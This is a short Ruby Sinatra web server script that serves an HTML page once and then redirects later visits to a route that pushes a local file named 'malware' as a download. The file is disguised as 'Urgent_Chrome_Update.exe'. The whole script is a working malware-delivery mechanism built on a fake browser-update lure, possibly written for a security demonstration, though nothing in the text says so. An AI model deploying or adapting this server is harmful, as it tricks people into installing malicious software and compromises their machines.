require 'sinatra'

set :bind, ARGV[0]
set :port, ARGV[1].to_i

$redirect = false

get '/' do
  $redirect = true
  response.header['Cache-Control'] = 'no-store'
  redirect '/index.html'
end

get '/index.html' do
  response.header['Cache-Control'] = 'no-store'
  if $redirect
    $redirect = false
    File.read('index.html')
  else
    redirect 'data'
  end
end

get '/data' do
  headers 'Cache-Control' => 'no-store',
          'Content-type' => 'application/x-msdownload',
          'Content-Disposition' => 'attachment; filename=Urgent_Chrome_Update.exe'
  File.binread('malware')
end
